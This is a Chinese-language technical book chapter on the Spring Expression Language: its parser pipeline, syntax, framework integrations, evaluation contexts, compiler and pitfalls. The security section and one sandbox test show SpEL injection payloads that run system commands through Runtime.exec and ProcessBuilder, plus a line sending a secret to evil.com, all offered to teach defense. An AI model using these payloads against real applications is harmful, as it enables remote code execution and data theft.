第 7 章 · SpEL 表达式引擎

v7 图解版 · 自动从 v6 markdown 生成 · Mermaid 图原样保留

Spring Expression Language(SpEL)是 Spring 生态的核心表达式基础设施,支撑 @Value、@Cacheable、@PreAuthorize、@ConditionalOnExpression、Spring Data @Query 等大量声明式编程场景。其设计遵循经典编译器前端架构:源字符串 → 词法分析(Lexer)→ 语法分析(Parser)→ 抽象语法树(AST)→ 求值(Evaluation)。与传统编译器不同,SpEL 的 AST 节点本身即可执行,每个节点实现 getValue() 方法,递归遍历即完成求值。

本章按"问题 → 机制 → 实现 → 边界/陷阱"组织。首节构建 SpEL 的架构模型与核心 API;第二节给出语法全景速查;第三节梳理 SpEL 在 Spring 框架中的七大应用场景;第四节深入 EvaluationContext 与类型系统;第五节剖析 SpelCompiler 的字节码生成与编译决策;第六节讨论六类典型陷阱与安全边界;末节给出源码入口表与本章要点。

阅读本章前,建议先掌握第 3 章(IoC 容器)与第 5 章(AOP 代理)的基础内容,因为 SpEL 的 Bean 引用与注解集成深度依赖这两个机制。

7.1 SpEL 的架构与解析管线

7.1.1 编译器前端架构概述

SpEL 的实现遵循经典的编译器前端架构,由四个阶段构成:词法分析将源字符串切分为 Token 流;语法分析通过递归下降算法构建 AST;AST 节点直接持有求值逻辑,无需额外字节码生成;求值阶段递归调用各节点的 getValue() 方法。该架构使 SpEL 既可作为解释器使用,也可在性能关键场景下编译为 JVM 字节码。

整个解析管线在 SpelExpressionParser.parseExpression(String) 中完成,返回 SpelExpression 对象——这是一个包含 AST 根节点的可重用表达式句柄。后续每次求值通过 Expression.getValue(EvaluationContext) 触发,与解析过程完全解耦。

7.1.2 解析管线的可视化

图 7-1 · SpEL 完整解析管线(源字符串 → Lexer → Parser → AST → Evaluation → 结果)

7.1.3 核心 API 三要素

SpEL 的使用接口由三个核心组件构成:ExpressionParser 解析字符串为 Expression 对象;Expression 持有 AST,可反复求值;EvaluationContext 提供求值环境,包含变量、函数、类型与 Bean 解析器。

ExpressionParser parser = new SpelExpressionParser();

Expression exp = parser.parseExpression("'Order '.concat('Ready')");

StandardEvaluationContext ctx = new StandardEvaluationContext();
ctx.setVariable("order", currentOrder);

String result = exp.getValue(ctx, String.class);

输出结果为 Order Ready(类型 String)。Expression 对象一经解析可重复使用,推荐缓存以避免重复解析开销。

7.1.6 EvaluationContext 的两种实现

SpEL 提供两种 EvaluationContext 实现,语义差异显著。StandardEvaluationContext 提供完整能力:支持 T() 类型引用、new 构造器、@beanName Bean 引用、属性赋值。SimpleEvaluationContext 是受限沙箱:仅支持属性访问与可选的实例方法调用,禁用所有可能导致代码执行的高级特性。

7.2 SpEL 语法全景

7.2.1 字面量表达式

SpEL 支持五种字面量类型:字符串(单引号)、整型、浮点型、布尔、null。整型支持十进制与十六进制,浮点型支持科学计数法。

parser.parseExpression("'Order Ready'").getValue(String.class);    // "Order Ready"
parser.parseExpression("42").getValue(Integer.class);              // 42
parser.parseExpression("3.14").getValue(Double.class);             // 3.14
parser.parseExpression("0xFF").getValue(Integer.class);            // 255
parser.parseExpression("6.022E23").getValue(Double.class);         // 6.022E23
parser.parseExpression("true").getValue(Boolean.class);            // true
parser.parseExpression("null").getValue();                         // null

7.2.2 属性访问与安全导航

SpEL 自动调用 getter 方法实现属性访问,支持嵌套属性。当中间属性为 null 时直接抛出 SpelEvaluationException,可使用安全导航运算符 ?. 避免该异常。

parser.parseExpression("name").getValue(ctx, order, String.class);
parser.parseExpression("address.city").getValue(ctx, order, String.class);
parser.parseExpression("address?.city").getValue(ctx, orderWithNullAddr);

异常输出形如:

order.address.city -> Shanghai
orderWithNullAddr.address.city -> SpelEvaluationException
  EL1007E: Property or field 'city' cannot be found on null
orderWithNullAddr.address?.city -> null

7.2.3 数组、列表与 Map 访问

数组与列表通过 [index] 访问,Map 通过 ['key'] 访问。SpEL 还支持内联列表 {1, 2, 3} 与内联 Map {'name':'A', 'age':30} 字面量。

parser.parseExpression("roles[0]").getValue(ctx, order, String.class);
parser.parseExpression("preferences['theme']").getValue(ctx, order);
parser.parseExpression("{1, 2, 3, 4, 5}").getValue(List.class);
parser.parseExpression("{'name':'Order','price':99}").getValue(Map.class);

7.2.4 方法调用

SpEL 支持任意公开方法调用,包括字符串方法、对象方法、带参数方法。方法解析通过 MethodResolver 链完成,默认实现是 ReflectiveMethodResolver。

parser.parseExpression("'order ready'.toUpperCase()").getValue(String.class);
parser.parseExpression("'a'.concat(' b')").getValue();
parser.parseExpression("'abcdef'.substring(2, 4)").getValue();
parser.parseExpression("orders.size()").getValue(ctx, customer, Integer.class);

7.2.6 变量、#root 与 #this

SpEL 支持三种特殊引用:#variableName 引用通过 setVariable() 注册的变量;#root 始终指向求值的根对象;#this 在集合迭代上下文中指向当前元素。

StandardEvaluationContext ctx = new StandardEvaluationContext();
ctx.setVariable("discount", 0.15);

parser.parseExpression("price * (1 - #discount)").getValue(ctx, order);
parser.parseExpression("#root.totalAmount").getValue(ctx);
parser.parseExpression("items.?[#this.price > 100]").getValue(ctx, cart);

7.2.7 集合投影与选择

集合投影 .![expr] 类似 Java Stream 的 map 操作,从集合中提取每个元素的某个属性组成新列表。集合选择 .?[predicate] 类似 filter 操作,过滤满足条件的元素。首选 .^[] 与末选 .$[] 分别返回第一个与最后一个匹配元素。

parser.parseExpression("members.![name]").getValue(ctx, group);
parser.parseExpression("members.?[age > 18]").getValue(ctx, group);
parser.parseExpression("members.?[age > 18].![name]").getValue(ctx, group);
parser.parseExpression("members.^[age > 18]").getValue(ctx, group);
parser.parseExpression("members.$[age > 18]").getValue(ctx, group);

7.2.8 模板表达式

模板表达式将字面文本与 #{...} 嵌入表达式混合。需通过 ParserContext.TEMPLATE_EXPRESSION 显式启用模板模式。Spring 的 @Value 注解使用的就是该模式。

Expression exp = parser.parseExpression(
    "Hello #{#order.name}, total #{#order.amount}",
    ParserContext.TEMPLATE_EXPRESSION
);
ctx.setVariable("order", order);
exp.getValue(ctx, String.class);

普通模式下整个字符串都是一个表达式;模板模式下字符串是文本模板,仅 #{...} 内部为表达式。两种模式不可混用。

7.3 SpEL 在 Spring 生态中的应用场景

7.3.1 SpEL 的渗透范围

SpEL 不是独立工具,而是 Spring 生态的"表达式基础设施"。从 IoC 容器到 Security,从 Cache 到 Data,几乎每个 Spring 子项目都使用 SpEL。

图 7-4 · SpEL 在 Spring 生态中的渗透(8 大子项目共用同一个引擎)

7.3.2 场景一:@Value 属性注入与表达式

@Value 注解支持两种语法:${...} 是属性占位符,由 PropertySourcesPlaceholderConfigurer 在 BeanFactoryPostProcessor 阶段处理;#{...} 是 SpEL 表达式,由 BeanExpressionResolver 在 Bean 创建阶段求值。两者可嵌套为 #{${...}},但不可反向嵌套。

@Component
public class AppConfig {
    @Value("${server.port:8080}")
    private int serverPort;

    @Value("#{T(java.lang.Runtime).getRuntime().availableProcessors()}")
    private int cpuCores;

    @Value("#{${app.multiplier:2} * 10}")
    private int derivedValue;

    @Value("#{dataSourceConfig.maxPoolSize * 2}")
    private int maxConnections;

    @Value("#{T(java.util.UUID).randomUUID().toString()}")
    private String instanceId;
}

7.3.3 场景二:@Cacheable 缓存 Key 生成

@Cacheable 系列注解通过 SpEL 表达式动态生成缓存键、控制缓存条件、过滤缓存内容。表达式上下文提供 #root、#result、方法参数引用等专用变量。

@Service
public class OrderService {
    @Cacheable(value = "orders", key = "#orderId")
    public Order findById(Long orderId) { return null; }

    @Cacheable(value = "search",
               key = "#keyword + '_' + #page + '_' + #size")
    public Page<Product> search(String keyword, int page, int size) { return null; }

    @Cacheable(value = "orders",
               key = "#orderId",
               condition = "#orderId > 0",
               unless = "#result?.status == 'CANCELLED'")
    public Order findActiveOrder(Long orderId) { return null; }

    @CacheEvict(value = "orders",
                key = "#root.methodName + '_' + #orderId")
    public void deleteOrder(Long orderId) { }
}

7.3.4 场景三:@PreAuthorize 安全表达式

Spring Security 通过 MethodSecurityExpressionHandler 创建以 SecurityExpressionRoot 为根对象的 StandardEvaluationContext。hasRole()、hasAuthority()、permitAll() 等方法实际上是 SecurityExpressionRoot 的实例方法,而非 SpEL 内建函数。

@RestController
public class DocumentController {
    @PreAuthorize("hasRole('ADMIN')")
    @DeleteMapping("/{id}")
    public void delete(@PathVariable Long id) { }

    @PreAuthorize("#doc.ownerId == authentication.principal.id or hasRole('ADMIN')")
    @PutMapping("/{id}")
    public Document update(@PathVariable Long id, @RequestBody Document doc) { return doc; }

    @PostFilter("filterObject.ownerId == authentication.principal.id or hasRole('ADMIN')")
    @GetMapping
    public List<Document> findAll() { return List.of(); }

    @PreAuthorize("@documentPermissionEvaluator.canAccess(authentication, #id)")
    @GetMapping("/{id}")
    public Document findById(@PathVariable Long id) { return null; }
}

7.3.5 场景四:@ConditionalOnExpression 条件装配

@ConditionalOnExpression 在 Bean 注册阶段对 SpEL 表达式求值,根据结果决定是否创建 Bean。表达式可访问 Environment 属性、调用静态方法、引用其他 Bean。

@Configuration
public class FeatureConfig {
    @Bean
    @ConditionalOnExpression("${feature.premium.enabled:false}")
    public PremiumService premiumService() {
        return new PremiumService();
    }

    @Bean
    @ConditionalOnExpression(
        "${app.cache.enabled:true} and '${app.cache.type}'.equals('redis')")
    public RedisCacheManager redisCacheManager() {
        return new RedisCacheManager();
    }

    @Bean
    @ConditionalOnExpression(
        "#{T(java.lang.Runtime).getRuntime().availableProcessors() >= 4}")
    public ParallelProcessingService parallelService() {
        return new ParallelProcessingService();
    }
}

7.3.6 场景五:Spring Data @Query 实体名称 SpEL

Spring Data 在 @Query 中支持 SpEL 表达式,常见用法包括 #{#entityName} 自动替换实体类名、?#{principal?.id} 引用安全上下文、动态条件构造。

public interface ProductRepository extends JpaRepository<Product, Long> {
    @Query("SELECT p FROM #{#entityName} p WHERE p.status = :status")
    List<Product> findByStatus(@Param("status") String status);

    @Query("SELECT d FROM Document d WHERE d.ownerId = ?#{principal?.id}")
    List<Document> findMyDocuments();
}

7.3.7 场景六:Spring Cloud Gateway Bean 引用

Spring Cloud Gateway 配置中通过 #{@beanName} 引用 Spring Bean,典型场景是为限流器指定自定义 KeyResolver。

spring:
  cloud:
    gateway:
      routes:
        - id: premium-route
          uri: lb://premium-service
          predicates:
            - Path=/api/premium/**
          filters:
            - name: RequestRateLimiter
              args:
                key-resolver: "#{@orderKeyResolver}"
                redis-rate-limiter.replenishRate: 50

7.3.8 场景七:Spring Batch 延迟绑定

Spring Batch 使用 SpEL 实现 Job Parameters 的延迟绑定。@StepScope Bean 在步骤执行时才创建,此时 #{jobParameters['date']} 才被求值。该机制使得 Job 参数能够在运行时动态注入到 Reader、Processor、Writer 中。

@Bean
@StepScope
public FlatFileItemReader<Trade> tradeReader(
    @Value("#{jobParameters['input.file']}") Resource inputFile,
    @Value("#{jobParameters['trade.date']}") String tradeDate) {
    return new FlatFileItemReaderBuilder<Trade>()
        .name("tradeReader")
        .resource(inputFile)
        .delimited()
        .names("symbol", "price", "quantity")
        .build();
}

7.4 EvaluationContext 与类型系统

7.4.1 EvaluationContext 的组件架构

EvaluationContext 是 SpEL 的"运行时环境",决定了表达式可访问的属性、方法、类型与 Bean。其内部由七类组件构成,每类组件都有独立的扩展点。

图 7-5 · EvaluationContext 组件架构(7 类组件 + 多个可扩展实现)

7.4.2 PropertyAccessor 的策略链

当 SpEL 遇到 object.property 时,按顺序尝试 PropertyAccessor 链中的每个实现,直到找到能处理的实现。默认实现包括 ReflectivePropertyAccessor(基于反射读取 getter)、MapAccessor(将 Map 视为对象)、EnvironmentAccessor(访问 Environment 属性)。

public class JsonNodePropertyAccessor implements PropertyAccessor {
    @Override
    public Class<?>[] getSpecificTargetClasses() {
        return new Class<?>[]{JsonNode.class};
    }

    @Override
    public boolean canRead(EvaluationContext ctx, Object target, String name) {
        return target instanceof JsonNode && ((JsonNode) target).has(name);
    }

    @Override
    public TypedValue read(EvaluationContext ctx, Object target, String name) {
        JsonNode node = ((JsonNode) target).get(name);
        return new TypedValue(node);
    }

    @Override
    public boolean canWrite(EvaluationContext ctx, Object target, String name) {
        return false;
    }

    @Override
    public void write(EvaluationContext ctx, Object target, String name, Object value) {
        throw new UnsupportedOperationException("JSON nodes are read-only");
    }
}

注册自定义 PropertyAccessor 后,SpEL 即可遍历 JSON 树:

StandardEvaluationContext ctx = new StandardEvaluationContext(jsonRoot);
ctx.addPropertyAccessor(new JsonNodePropertyAccessor());
parser.parseExpression("order.address.city").getValue(ctx);

7.4.3 TypeConverter 的转换链

SpEL 使用 TypeConverter 自动将求值结果转换为目标类型。默认的 StandardTypeConverter 委托给 Spring 的 ConversionService,后者支持注册自定义 Converter。

Expression exp = parser.parseExpression("'42'");

Integer intVal = exp.getValue(Integer.class);
Boolean boolVal = parser.parseExpression("'true'").getValue(Boolean.class);

DefaultConversionService conversionService = new DefaultConversionService();
conversionService.addConverter(new StringToLocalDateConverter());

StandardEvaluationContext ctx = new StandardEvaluationContext();
ctx.setTypeConverter(new StandardTypeConverter(conversionService));

parser.parseExpression("'2024-01-15'").getValue(ctx, LocalDate.class);

7.4.4 EvaluationContext 选择决策树

选择 StandardEvaluationContext 与 SimpleEvaluationContext 的核心判据是表达式来源的可信度。来自用户输入或外部数据的表达式必须使用 SimpleEvaluationContext;框架内部硬编码的表达式可使用 StandardEvaluationContext。

图 7-6 · EvaluationContext 选择决策流(用户输入 → Simple / 内部硬编码 → Standard)

7.4.5 SecurityExpressionRoot 作为定制范例

Spring Security 是 EvaluationContext 定制的经典范例。MethodSecurityExpressionHandler 创建 SecurityExpressionRoot 作为根对象,向 SpEL 表达式暴露一整套安全函数。hasRole() 不是 SpEL 内建函数,而是根对象的方法。

public abstract class SecurityExpressionRoot {
    protected final Authentication authentication;

    public boolean hasRole(String role) { return hasAnyRole(role); }
    public boolean hasAuthority(String authority) { return hasAnyAuthority(authority); }
    public boolean permitAll() { return true; }
    public boolean isAuthenticated() { return authentication != null && authentication.isAuthenticated(); }

    public Authentication getAuthentication() { return authentication; }
}

当使用 @PreAuthorize("hasRole('ADMIN') and authentication.name == #username") 时,SpEL 引擎的解析步骤为:hasRole('ADMIN') 调用 root.hasRole("ADMIN");authentication 调用 root.getAuthentication();.name 调用 authentication.getName();#username 查找变量表中的 username。

7.5 SpEL 编译器与字节码生成

7.5.1 三种编译模式

SpEL 默认以解释模式运行,每次 getValue() 都遍历 AST 并通过反射调用方法。从 Spring Framework 4.1 起引入 SpelCompiler,可将表达式编译为 JVM 字节码,性能提升量级达 10 倍。编译模式由 SpelParserConfiguration 控制,共三种:

模式 配置值 行为 适用场景
OFF SpelCompilerMode.OFF 纯解释执行,不编译 默认值,调试或低频表达式
IMMEDIATE SpelCompilerMode.IMMEDIATE 首次求值后立即编译 类型稳定的高频表达式
MIXED SpelCompilerMode.MIXED 先解释执行若干次,再编译,失败回退解释 推荐,安全且高性能 
SpelParserConfiguration config = new SpelParserConfiguration(
    SpelCompilerMode.MIXED,
    this.getClass().getClassLoader()
);
ExpressionParser parser = new SpelExpressionParser(config);

Spring Boot 中可通过 application.yml 全局配置:

spring:
  expression:
    compiler:
      mode: MIXED

7.5.2 字节码生成原理

SpelCompiler 使用 ASM 库直接生成字节码。对于表达式 payload.amount > 100,编译器生成的等效字节码逻辑上类似:

public class SpelCompiledExpression_abc123 extends CompiledExpression {
    @Override
    public Object getValue(Object target, EvaluationContext ctx) {
        Object payload = ((Order) target).getPayload();
        double amount = ((Payload) payload).getAmount();
        return amount > 100.0;
    }
}

对比解释模式的执行路径:PropertyOrFieldReference.getValueInternal() → ReflectivePropertyAccessor.read() → 查找 getter → Method.invoke() → 比较与装箱。编译模式省去了 AST 遍历与反射,直接生成内联的属性访问代码。

7.5.3 性能特征对比

模式 单次求值量级 说明
原生 Java 10-20 ns 直接代码,作为基线
SpEL 解释模式 800-1000 ns AST 遍历 + 反射,低频无感,高频累积可观
SpEL MIXED 编译 70-120 ns 类型稳定后生成字节码,适合缓存键等热路径

上述数字表示量级趋势,真实结果取决于 JVM 版本、表达式复杂度、对象模型与 JIT 热身状态。建议通过 JMH 在目标环境实际测量。

7.5.5 编译失败的常见原因

并非所有 SpEL 表达式都能编译。下列语法会导致编译器回退到解释模式:

不可编译语法 原因 替代方案
赋值表达式 a = b 编译器仅支持只读求值 使用 setValue() API
集合投影 .![expr] 运行时类型不确定 Java Stream API
集合选择 .?[expr] 运行时类型不确定 Java Stream API
Bean 引用 @beanName 需要 BeanFactory 运行时查找 直接注入 Bean
安全导航 ?. null 分支导致类型不确定 预检查 null
混合类型算术 整型/浮点自动提升难以静态确定 统一类型

7.6 典型陷阱与安全边界

7.6.1 陷阱一:SpEL 注入与远程代码执行

将用户输入直接拼接到 SpEL 表达式并使用 StandardEvaluationContext 求值,攻击者可执行任意系统命令。该漏洞严重程度等同于 SQL 注入,属于 CVE 级安全问题。

String userInput = request.getParameter("filter");
Expression exp = parser.parseExpression(userInput);
exp.getValue(new StandardEvaluationContext());

// 攻击者传入: T(java.lang.Runtime).getRuntime().exec('calc')
// 后果: 服务端执行任意命令

修复方案有三:其一,绝不将用户输入直接作为 SpEL 表达式或拼接到表达式中;其二,若必须动态求值,使用 SimpleEvaluationContext 沙箱;其三,将用户输入作为变量传入而非拼接(ctx.setVariable("input", userInput),表达式中用 #input 引用)。

7.6.2 陷阱二:T() 类型逃逸

T() 可引用任何 Java 类,包括 Runtime、ProcessBuilder、ClassLoader、System 等危险类。在 StandardEvaluationContext 下毫无限制。下列表达式在该上下文下全部合法且会被执行:

T(java.lang.Runtime).getRuntime().exec("whoami")
new java.lang.ProcessBuilder("cmd","/c","dir").start()
T(java.lang.Thread).sleep(60000)
T(java.lang.System).exit(0)
new java.net.URL("http://evil.com/steal?data=" + #secret).openStream()

修复:对任何可能接触不可信输入的场景,始终使用 SimpleEvaluationContext。该上下文完全禁用 T()、new 与 Bean 引用,无法触达上述危险类。

7.6.3 陷阱三:Null 导航缺失导致 NPE

嵌套属性访问若中间节点为 null,SpEL 抛出 SpelEvaluationException。异常堆栈仅显示 SpEL 内部位置,不指明哪一级属性为 null,定位困难。修复方案是对每个可能为 null 的节点使用 ?. 安全导航,并用 Elvis 运算符 ?: 提供默认值。

@Value("#{orderService.getCurrentUser().fulfillmentCenter.name}")
private String deptName;

@Value("#{orderService.getCurrentUser()?.fulfillmentCenter?.name ?: 'N/A'}")
private String deptNameSafe;

7.6.4 陷阱四:#{} 与 ${} 混淆

${...} 是属性占位符,由 PropertySourcesPlaceholderConfigurer 在 BeanFactoryPostProcessor 阶段处理,从 application.yml、环境变量等属性源查找值。#{...} 是 SpEL 表达式,由 BeanExpressionResolver 在 Bean 创建阶段求值。两者求值阶段不同,语法不可混用。

图 7-8 · ${} 与 #{} 的处理阶段差异(BFPP 阶段 → Bean 创建阶段)

正确用法:

@Value("${app.name:MyApp}")           // 属性占位符
private String appName;

@Value("#{T(Math).random()}")          // SpEL 表达式
private double rand;

@Value("#{${app.multiplier:2} * 10}")  // 嵌套:先 ${} 后 #{}
private int derivedValue;

7.6.5 陷阱五:解释模式在热路径上的开销

SpEL 在解释模式下,每次求值涉及 AST 遍历与反射调用。低频场景(如启动时 @Value 注入)无感,但在高频场景下成为性能瓶颈。典型场景是 @Cacheable 的 key 表达式在每次缓存访问时都执行。

表达式调用频率 解释模式开销 编译模式开销
启动注入(单次) 800-1000 ns,无感 70-120 ns,无感
中频(100/s) 80-100 µs/s,无感 7-12 µs/s,无感
高频(50000/s) 40-50 ms/s,占 4-5% CPU 3.5-6 ms/s,占 0.4% CPU
极高频(500000/s) 400-500 ms/s,影响显著 35-60 ms/s,可接受

建议:为高频场景启用 spring.expression.compiler.mode=MIXED;对极致性能要求,考虑自定义 KeyGenerator 替代 SpEL。

7.6.6 陷阱六:集合投影/选择的隐式内存分配

.?[condition] 与 .![projection] 每次求值都创建新的 ArrayList。在循环或高频调用中使用会产生大量短生命周期对象,增加 GC 压力。

for (Order order : orders) {
    List<Item> expensive = parser
        .parseExpression("items.?[price > 100]")
        .getValue(ctx, order, List.class);
}

优化方案:其一,缓存 Expression 对象避免重复解析;其二,在性能敏感场景改用 Java Stream API。

Expression exp = parser.parseExpression("items.?[price > 100]");
for (Order order : orders) {
    List<Item> expensive = exp.getValue(ctx, order, List.class);
}

orders.stream()
    .flatMap(o -> o.getItems().stream())
    .filter(i -> i.getPrice() > 100)
    .toList();

7.7.3 设计取舍与被拒绝方案

SpEL 的原始定位是 Spring 内部表达式基础设施,而非给用户输入开放的沙箱语言。它默认选择"与 Java 对象模型深度互通",代价是安全边界必须由调用方显式收紧。

设计选择 设计动机 被拒绝方案 适用边界
AST 节点直接求值 实现简单,解释模式覆盖全部语法 一律编译为字节码 启动期、低频表达式
StandardEvaluationContext 默认全能力 可访问类型、Bean、构造器、方法 默认沙箱受限 仅用于框架内可信表达式
SimpleEvaluationContext 受限变体 禁用 T() / new / Bean 引用 不支持必要的 Spring 集成 用户过滤条件、数据绑定
编译器只编译稳定子集 热路径性能接近原生 Java 编译全部语法 缓存 key、简单属性判断
上层模块各自构建 root object Security / Cache / Data 暴露领域语义 统一 root 接口 需查阅具体模块 evaluator

被拒绝的替代方案同样重要:仅作配置开关时优先使用 @ConfigurationProperties 绑定为强类型对象;仅作缓存键时复杂规则优先使用 KeyGenerator;表达式来自外部用户时优先设计白名单查询 DSL,而非暴露 SpEL。

7.7.4 扩展边界与测试护栏

SpEL 的扩展点应围绕"让表达式能读到什么",而非绕过安全模型。PropertyAccessor、MethodResolver、TypeLocator、TypeConverter、BeanResolver 都能改变运行时能力,任何一个暴露过宽都会放大攻击面。

@Test
void untrustedExpressionCannotEscapeSandbox() {
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(
        "T(java.lang.Runtime).getRuntime().exec('calc')");

    SimpleEvaluationContext context = SimpleEvaluationContext
        .forReadOnlyDataBinding()
        .build();

    assertThatThrownBy(() -> expression.getValue(context))
        .isInstanceOf(SpelEvaluationException.class);
}

@Test
void cacheExpressionKeepsExpectedKeyShape() {
    EvaluationContext context = cacheOperationExpressionEvaluator
        .createEvaluationContext(caches, method, args, target, targetClass,
            CacheOperationExpressionEvaluator.NO_RESULT);

    Object key = parser.parseExpression("#orderId + ':' + #page")
        .getValue(context);

    assertThat(key).isEqualTo("42:0");
}

建议保留三类守护:其一,安全测试证明不可信表达式无法使用 T() / new / @bean;其二,集成测试保存关键 @Cacheable / @PreAuthorize 表达式的输入输出;其三,热路径若启用编译模式,通过 JMH 或应用级计时验证"表达式求值占比"真的下降。

表达式语法正确 解析阶段不抛 ParseException parseExpression() 返回非空

7.8 本章小结

本章系统剖析了 Spring Expression Language 的内部机制与生态应用,核心要点归纳如下:

SpEL 是一个完整的表达式引擎,采用 Lexer → Parser → AST → Evaluation 的编译器前端架构。其 AST 节点本身可执行,无需额外字节码生成。语法覆盖字面量、属性访问、方法调用、运算符、集合操作、类型引用等,功能远超传统配置占位符。

SpEL 是 Spring 生态的"隐形基础设施"。@Value、@Cacheable、@PreAuthorize、@ConditionalOnExpression、Spring Data @Query、Spring Cloud Gateway、Spring Batch 延迟绑定等均依赖 SpEL 求值。各上层模块通过定制 EvaluationContext 暴露领域语义,典型范例是 Spring Security 的 SecurityExpressionRoot。

EvaluationContext 决定 SpEL 的安全边界。StandardEvaluationContext 提供完整能力但风险高——可执行任意 Java 代码;SimpleEvaluationContext 是安全沙箱,禁用 T() / new / Bean 引用。处理用户输入时必须使用后者。

SpEL 编译器在 MIXED 模式下提供 10 倍性能提升。编译失败时自动回退到解释模式,对调用方透明。但集合投影/选择、Bean 引用、安全导航等语法不支持编译。高频场景应启用 spring.expression.compiler.mode=MIXED。

SpEL 注入是 CVE 级安全漏洞。永远不要将用户输入直接拼接到 SpEL 表达式中。最佳实践是:使用 SimpleEvaluationContext 沙箱 + 通过 setVariable() 传入用户值 + 表达式中用 #input 引用。

下一章将探讨 Spring 的 Resource 资源抽象。SpEL 的 #{...} 表达式与 Resource 的 ${...} 占位符在 @Value 等场景下经常协同工作,理解两者的求值阶段差异是避免常见误用的关键。
